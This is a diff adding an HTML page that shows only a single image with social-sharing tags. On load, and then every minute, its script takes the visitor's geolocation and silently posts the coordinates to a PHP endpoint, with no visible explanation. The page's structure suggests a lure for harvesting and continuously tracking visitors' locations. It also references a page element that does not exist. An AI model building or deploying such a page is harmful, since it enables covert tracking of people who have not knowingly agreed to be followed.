@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HTML Geolocation</title>
+    <!-- Bootstrap CSS CDN -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="./logo.png" type="image/x-icon">
+    <!-- Meta tags for social sharing -->
+    <meta property="og:title" content="HTML Geolocation">
+    <meta property="og:description" content="Share your coordinates with HTML Geolocation.">
+    <meta property="og:image" content="dot.png">
+</head>
+<body onload="initGeolocation()">
+    <div class="container-fluid">
+        <div class="row mt-5">
+           
+            <div class="col-md-12">
+                <!-- Image -->
+                <img src="./dot.png" alt="Featured Image" class="img-fluid" width="100%" height="100%">
+                <br>
+                <!-- Button to connect -->
+              
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const x = document.getElementById("demo");
+        let watchId;
+
+        function initGeolocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, handleLocationError);
+                // Refresh data every minute
+                watchId = setInterval(getLocation, 60000);
+            } else {
+                x.innerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function getLocation() {
+            navigator.geolocation.getCurrentPosition(showPosition, handleLocationError);
+        }
+
+        function showPosition(position) {
+            // Call function to submit coordinates to PHP script
+            submitCoordinates(position.coords.latitude, position.coords.longitude);
+        }
+
+        function handleLocationError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    x.innerHTML = "User denied the request for Geolocation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    x.innerHTML = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    x.innerHTML = "The request to get user location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    x.innerHTML = "An unknown error occurred.";
+                    break;
+            }
+            clearInterval(watchId); // Stop refreshing if there's an error
+        }
+
+        function submitCoordinates(latitude, longitude) {
+            // Create a new XMLHttpRequest object
+            let xhr = new XMLHttpRequest();
+
+            // Define the PHP script URL
+            let url = "submit_coordinates.php";
+
+            // Specify the POST method and URL
+            xhr.open("POST", url, true);
+
+            // Set Content-Type header
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+            // Define the data to be sent to the server
+            let data = "latitude=" + latitude + "&longitude=" + longitude;
+
+            // Send the request with the data
+            xhr.send(data);
+        }
+    </script>
+
+    <!-- Bootstrap JS CDN -->
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+</body>
+</html>
